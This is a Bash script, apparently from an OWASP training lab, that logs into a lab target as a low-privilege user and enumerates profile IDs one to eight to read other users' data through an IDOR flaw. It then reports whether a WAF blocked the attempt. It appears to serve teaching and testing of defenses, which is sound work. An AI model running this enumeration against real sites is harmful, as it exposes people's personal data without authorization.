#!/usr/bin/env bash
# ============================================================
# Vulnbox Lab — Ataque: IDOR em Perfis (A01)
# ============================================================

TARGET="${TARGET:-http://owasp-lab-sentinel-gateway}"
USERNAME="user1"
PASSWORD="123456"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
CYN='\033[0;36m'; BLD='\033[1m'; RST='\033[0m'

echo -e "\n${BLD}${CYN}════════════════════════════════════════════════${RST}"
echo -e "${BLD}  🔴 ATAQUE: IDOR em Perfis — OWASP A01${RST}"
echo -e "${CYN}════════════════════════════════════════════════${RST}"
echo -e "  Alvo    : ${TARGET}/profile.php"
echo -e "  Usuário : ${USERNAME} (role=user, id=3)"
echo -e "${CYN}────────────────────────────────────────────────${RST}\n"

# Passo 1: Fazer login e obter cookie de sessão
echo -e "  ${YLW}[1/3] Fazendo login como ${USERNAME}...${RST}"
COOKIE_JAR=$(mktemp /tmp/kali_cookies_XXXXXX.txt)

LOGIN_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "${TARGET}/login.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=${USERNAME}&password=${PASSWORD}" \
    -c "$COOKIE_JAR" \
    -L --max-time 10 2>/dev/null)

if [ "$LOGIN_CODE" != "200" ] && [ "$LOGIN_CODE" != "302" ]; then
    echo -e "  ${RED}Falha no login (HTTP ${LOGIN_CODE}). O gateway está ativo?${RST}"
    rm -f "$COOKIE_JAR"
    exit 1
fi

echo -e "  ${GRN}Login realizado. Cookie de sessão obtido.${RST}"
echo ""

# Passo 2: Enumerar perfis por ID
echo -e "  ${YLW}[2/3] Enumerando perfis por ID...${RST}"
echo ""

BLOCKED=0
VULNERABLE_COUNT=0

for ID in 1 2 3 4 5 6 7 8; do
    RESP=$(curl -s -w "\n%{http_code}" \
        -b "$COOKIE_JAR" \
        "${TARGET}/profile.php?id=${ID}" \
        --max-time 5 2>/dev/null)
    
    HTTP_CODE=$(echo "$RESP" | tail -1)
    BODY=$(echo "$RESP" | head -n -1)

    if [ "$HTTP_CODE" = "403" ]; then
        if echo "$BODY" | grep -qi "WAF\|gateway\|bloqueado\|Sentinel Gateway"; then
            echo -e "  id=${BLD}${ID}${RST} → ${RED}HTTP 403 — BLOQUEADO PELO WAF 🛡️${RST}"
            BLOCKED=1
            break
        else
            echo -e "  id=${BLD}${ID}${RST} → ${GRN}HTTP 403 — App negou acesso (corrigido) ✅${RST}"
        fi
    elif [ "$HTTP_CODE" = "200" ]; then
        # Extrai nome do usuário do perfil se presente
        USERNAME_FOUND=$(echo "$BODY" | grep -oP '(?<=<td>)[^<]+(?=</td>)' | head -3 | tr '\n' ' ' 2>/dev/null || echo "")
        echo -e "  id=${BLD}${ID}${RST} → ${RED}HTTP 200 — VULNERÁVEL ⚠️ dados: ${USERNAME_FOUND}${RST}"
        VULNERABLE_COUNT=$((VULNERABLE_COUNT + 1))
    else
        echo -e "  id=${BLD}${ID}${RST} → HTTP ${HTTP_CODE}"
    fi
    sleep 0.4
done

rm -f "$COOKIE_JAR"

echo ""
echo -e "${CYN}────────────────────────────────────────────────${RST}"
if [ $BLOCKED -eq 1 ]; then
    echo -e "  ${GRN}${BLD}RESULTADO: WAF BLOQUEOU a enumeração IDOR ✅${RST}"
    echo -e "  Gateway detectou acesso a múltiplos IDs e bloqueou"
elif [ $VULNERABLE_COUNT -gt 1 ]; then
    echo -e "  ${RED}${BLD}RESULTADO: VULNERÁVEL — ${VULNERABLE_COUNT} perfis acessíveis ⚠️${RST}"
    echo -e "  Dados de outros usuários expostos via IDOR"
else
    echo -e "  ${GRN}${BLD}RESULTADO: App negou acessos não autorizados ✅${RST}"
fi
echo -e "${CYN}════════════════════════════════════════════════${RST}\n"

